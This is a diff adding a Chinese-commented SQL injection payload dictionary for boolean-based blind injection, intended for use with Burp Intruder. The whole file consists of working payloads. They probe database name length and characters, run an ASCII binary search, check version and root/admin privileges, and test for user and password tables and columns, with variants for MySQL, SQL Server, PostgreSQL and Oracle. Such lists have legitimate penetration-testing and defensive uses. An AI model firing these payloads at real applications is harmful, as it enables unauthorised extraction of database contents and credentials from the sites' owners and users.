@@ -1,0 +1,190 @@
+# ============================================================
+# SQL Injection Payload Dictionary — 06 布尔盲注类
+# 用途: 页面无回显但有真/假差异时，逐字符猜测数据
+# 原理: AND true → 正常页面，AND false → 不同页面
+# 使用: 在 Burp Intruder 中按响应长度/状态码分组
+# ============================================================
+
+# ========== 基础真假检测 ==========
+AND 1=1
+AND 1=2
+OR 1=1
+OR 1=2
+AND '1'='1
+AND '1'='2
+OR '1'='1
+OR '1'='2
+AND (SELECT 1)=1
+AND (SELECT 1)=2
+
+# ========== 数据库名长度探测 ==========
+AND LENGTH(database())=1
+AND LENGTH(database())=2
+AND LENGTH(database())=3
+AND LENGTH(database())=4
+AND LENGTH(database())=5
+AND LENGTH(database())=6
+AND LENGTH(database())=7
+AND LENGTH(database())=8
+AND LENGTH(database())=9
+AND LENGTH(database())=10
+AND LENGTH(database())=15
+AND LENGTH(database())=20
+
+# ========== 数据库名字符探测（逐字符，小写字母）==========
+AND SUBSTRING((SELECT database()),1,1)='a'
+AND SUBSTRING((SELECT database()),1,1)='b'
+AND SUBSTRING((SELECT database()),1,1)='c'
+AND SUBSTRING((SELECT database()),1,1)='d'
+AND SUBSTRING((SELECT database()),1,1)='e'
+AND SUBSTRING((SELECT database()),1,1)='f'
+AND SUBSTRING((SELECT database()),1,1)='g'
+AND SUBSTRING((SELECT database()),1,1)='h'
+AND SUBSTRING((SELECT database()),1,1)='i'
+AND SUBSTRING((SELECT database()),1,1)='j'
+AND SUBSTRING((SELECT database()),1,1)='k'
+AND SUBSTRING((SELECT database()),1,1)='l'
+AND SUBSTRING((SELECT database()),1,1)='m'
+AND SUBSTRING((SELECT database()),1,1)='n'
+AND SUBSTRING((SELECT database()),1,1)='o'
+AND SUBSTRING((SELECT database()),1,1)='p'
+AND SUBSTRING((SELECT database()),1,1)='q'
+AND SUBSTRING((SELECT database()),1,1)='r'
+AND SUBSTRING((SELECT database()),1,1)='s'
+AND SUBSTRING((SELECT database()),1,1)='t'
+AND SUBSTRING((SELECT database()),1,1)='u'
+AND SUBSTRING((SELECT database()),1,1)='v'
+AND SUBSTRING((SELECT database()),1,1)='w'
+AND SUBSTRING((SELECT database()),1,1)='x'
+AND SUBSTRING((SELECT database()),1,1)='y'
+AND SUBSTRING((SELECT database()),1,1)='z'
+
+# ========== 数据库名字符探测（大写字母）==========
+AND SUBSTRING((SELECT database()),1,1)='A'
+AND SUBSTRING((SELECT database()),1,1)='B'
+AND SUBSTRING((SELECT database()),1,1)='C'
+AND SUBSTRING((SELECT database()),1,1)='D'
+AND SUBSTRING((SELECT database()),1,1)='E'
+AND SUBSTRING((SELECT database()),1,1)='F'
+AND SUBSTRING((SELECT database()),1,1)='G'
+AND SUBSTRING((SELECT database()),1,1)='H'
+AND SUBSTRING((SELECT database()),1,1)='I'
+AND SUBSTRING((SELECT database()),1,1)='J'
+AND SUBSTRING((SELECT database()),1,1)='K'
+AND SUBSTRING((SELECT database()),1,1)='L'
+AND SUBSTRING((SELECT database()),1,1)='M'
+AND SUBSTRING((SELECT database()),1,1)='N'
+AND SUBSTRING((SELECT database()),1,1)='O'
+AND SUBSTRING((SELECT database()),1,1)='P'
+AND SUBSTRING((SELECT database()),1,1)='Q'
+AND SUBSTRING((SELECT database()),1,1)='R'
+AND SUBSTRING((SELECT database()),1,1)='S'
+AND SUBSTRING((SELECT database()),1,1)='T'
+AND SUBSTRING((SELECT database()),1,1)='U'
+AND SUBSTRING((SELECT database()),1,1)='V'
+AND SUBSTRING((SELECT database()),1,1)='W'
+AND SUBSTRING((SELECT database()),1,1)='X'
+AND SUBSTRING((SELECT database()),1,1)='Y'
+AND SUBSTRING((SELECT database()),1,1)='Z'
+
+# ========== 数据库名字符探测（数字）==========
+AND SUBSTRING((SELECT database()),1,1)='0'
+AND SUBSTRING((SELECT database()),1,1)='1'
+AND SUBSTRING((SELECT database()),1,1)='2'
+AND SUBSTRING((SELECT database()),1,1)='3'
+AND SUBSTRING((SELECT database()),1,1)='4'
+AND SUBSTRING((SELECT database()),1,1)='5'
+AND SUBSTRING((SELECT database()),1,1)='6'
+AND SUBSTRING((SELECT database()),1,1)='7'
+AND SUBSTRING((SELECT database()),1,1)='8'
+AND SUBSTRING((SELECT database()),1,1)='9'
+
+# ========== 数据库名字符探测（特殊字符）==========
+AND SUBSTRING((SELECT database()),1,1)='_'
+AND SUBSTRING((SELECT database()),1,1)='-'
+
+# ========== ASCII 码范围探测（二分法，比逐字符更快）==========
+AND ASCII(SUBSTRING((SELECT database()),1,1))>97
+AND ASCII(SUBSTRING((SELECT database()),1,1))>110
+AND ASCII(SUBSTRING((SELECT database()),1,1))>120
+AND ASCII(SUBSTRING((SELECT database()),1,1))=97
+AND ASCII(SUBSTRING((SELECT database()),1,1))=98
+AND ASCII(SUBSTRING((SELECT database()),1,1))=99
+AND ASCII(SUBSTRING((SELECT database()),1,1))=100
+AND ASCII(SUBSTRING((SELECT database()),1,1))=101
+AND ASCII(SUBSTRING((SELECT database()),1,1))=102
+AND ASCII(SUBSTRING((SELECT database()),1,1))=103
+AND ASCII(SUBSTRING((SELECT database()),1,1))=104
+AND ASCII(SUBSTRING((SELECT database()),1,1))=105
+AND ASCII(SUBSTRING((SELECT database()),1,1))=106
+AND ASCII(SUBSTRING((SELECT database()),1,1))=107
+AND ASCII(SUBSTRING((SELECT database()),1,1))=108
+AND ASCII(SUBSTRING((SELECT database()),1,1))=109
+AND ASCII(SUBSTRING((SELECT database()),1,1))=110
+AND ASCII(SUBSTRING((SELECT database()),1,1))=111
+AND ASCII(SUBSTRING((SELECT database()),1,1))=112
+AND ASCII(SUBSTRING((SELECT database()),1,1))=113
+AND ASCII(SUBSTRING((SELECT database()),1,1))=114
+AND ASCII(SUBSTRING((SELECT database()),1,1))=115
+AND ASCII(SUBSTRING((SELECT database()),1,1))=116
+AND ASCII(SUBSTRING((SELECT database()),1,1))=117
+AND ASCII(SUBSTRING((SELECT database()),1,1))=118
+AND ASCII(SUBSTRING((SELECT database()),1,1))=119
+AND ASCII(SUBSTRING((SELECT database()),1,1))=120
+AND ASCII(SUBSTRING((SELECT database()),1,1))=121
+AND ASCII(SUBSTRING((SELECT database()),1,1))=122
+
+# ========== 版本探测 ==========
+AND SUBSTRING(version(),1,1)='5'
+AND SUBSTRING(version(),1,1)='8'
+AND SUBSTRING(version(),1,3)='5.5'
+AND SUBSTRING(version(),1,3)='5.6'
+AND SUBSTRING(version(),1,3)='5.7'
+AND SUBSTRING(version(),1,3)='8.0'
+
+# ========== 用户权限探测 ==========
+AND (SELECT user()) LIKE '%root%'
+AND (SELECT user()) LIKE '%admin%'
+AND SUBSTRING(user(),1,4)='root'
+
+# ========== 表存在性探测 ==========
+AND (SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_SCHEMA=database())=0
+AND (SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_SCHEMA=database())>0
+AND (SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_SCHEMA=database())>5
+AND (SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_SCHEMA=database())>10
+AND (SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_NAME='users')>0
+AND (SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_NAME='user')>0
+AND (SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_NAME='admin')>0
+AND (SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_NAME='members')>0
+AND (SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_NAME='login')>0
+
+# ========== 列存在性探测 ==========
+AND (SELECT COUNT(*) FROM information_schema.columns WHERE TABLE_NAME='users' AND COLUMN_NAME='password')>0
+AND (SELECT COUNT(*) FROM information_schema.columns WHERE TABLE_NAME='users' AND COLUMN_NAME='pass')>0
+AND (SELECT COUNT(*) FROM information_schema.columns WHERE TABLE_NAME='users' AND COLUMN_NAME='pwd')>0
+AND (SELECT COUNT(*) FROM information_schema.columns WHERE TABLE_NAME='users' AND COLUMN_NAME='username')>0
+AND (SELECT COUNT(*) FROM information_schema.columns WHERE TABLE_NAME='users' AND COLUMN_NAME='email')>0
+
+# ========== SQL Server 布尔盲注 ==========
+AND LEN(DB_NAME())=1
+AND LEN(DB_NAME())=2
+AND LEN(DB_NAME())=3
+AND LEN(DB_NAME())=4
+AND LEN(DB_NAME())=5
+AND ASCII(SUBSTRING(DB_NAME(),1,1))>97
+
+# ========== PostgreSQL 布尔盲注 ==========
+AND LENGTH(current_database())=1
+AND LENGTH(current_database())=2
+AND LENGTH(current_database())=3
+AND LENGTH(current_database())=4
+AND LENGTH(current_database())=5
+AND ASCII(SUBSTRING(current_database(),1,1))>97
+
+# ========== Oracle 布尔盲注 ==========
+AND LENGTH((SELECT ora_database_name FROM dual))=1
+AND LENGTH((SELECT ora_database_name FROM dual))=2
+AND LENGTH((SELECT ora_database_name FROM dual))=3
+AND LENGTH((SELECT ora_database_name FROM dual))=4
+AND LENGTH((SELECT ora_database_name FROM dual))=5
+AND ASCII(SUBSTR((SELECT ora_database_name FROM dual),1,1))>97
